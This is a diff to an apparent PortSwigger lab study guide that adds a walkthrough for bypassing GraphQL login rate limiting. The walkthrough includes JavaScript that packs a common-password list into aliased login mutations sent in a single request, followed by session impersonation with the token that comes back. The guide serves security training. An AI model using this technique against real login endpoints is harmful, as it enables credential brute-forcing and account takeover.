@@ -2292,6 +2292,7 @@ Cookie: session=2ybmTxFLPlisA6GZvcw22Mvc29jYVuJm
 
 [Identify GraphQL API](#identify-graphql-api)  
 [GraphQL Reveal Credentials](#graphql-reveal-creds)  
+[GraphQL Brute Force](#graphql-brute-orce)  
 
 ### Identify GraphQL API  
 
@@ -2349,13 +2350,64 @@ Cookie: session=2ybmTxFLPlisA6GZvcw22Mvc29jYVuJm
 >There is a getUser query that returns a user's username and password. This query fetches the relevant user information via a direct reference to an id number.  
 
 >Modify a request by replacing the inQL tab query value to the below discovered `getuser` query from scanner.  
->In the POST JSON body remove the `operationname` property and value.  
+>In the POST JSON body remove the `operationName` property and value.  
 
 ![graphql-modify-request.png](images/graphql-modify-request.png)  
 
 >Log in to the site as the administrator, and gain access to the Admin panel.  
 
 [PortSwigger Lab: Accidental exposure of private GraphQL fields](https://portswigger.net/web-security/graphql/lab-graphql-accidental-field-exposure)  
+
+### GraphQL Brute Force  
+
+>The login API is protected by rate limiter to protect against brute force attacks.  
+>Sending too many incorrect login attempts to the API, rate limit protection response is ***identified*** with message below:  
+
+```graphql
+{  "errors": [
+    {
+      "path": [
+        "login"
+      ],
+      "extensions": {
+        "message": "You have made too many incorrect login attempts. Please try again in 1 minute(s)."
+      },
+      "locations": [
+        {
+          "line": 3,
+          "column": 9
+        }
+      ],
+      "message": "Exception while fetching data (/login) : You have made too many incorrect login attempts. Please try again in 1 minute(s)."
+    }
+  ],
+  "data": {
+    "login": null
+  } }
+```  
+
+>Using the following PortSwwigger JavaScript to generate a list of login combination as part of brute force attack that bypass rate limiting protection.  
+
+```javascript
+copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=>`
+bruteforce$index:login(input:{password: "$password", username: "carlos"}) {
+        token
+        success
+    }
+`.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log("The query has been copied to your clipboard.");
+```  
+
+![graphql-brute-list.png](images/graphql-brute-list.png)  
+
+>Using the output from the above JavaScript, and place it in the InQL tab of the login POST request `POST /graphql/v1 HTTP/2`, removing the `operationName` POST body parameter and value, before sending single request containing all possible passwords in the GraphQL query.  
+
+![graphql-brute-force-InQL.png](images/graphql-brute-force-InQL.png)  
+
+>Response from the single POST request is one value marked `true` and the client login token return in response.  
+
+>Replace the cookie in browser to impersonate Carlos user session.  
+
+[PortSwigger Lab: Bypassing GraphQL brute force protections](https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass)  
   
 -----
 
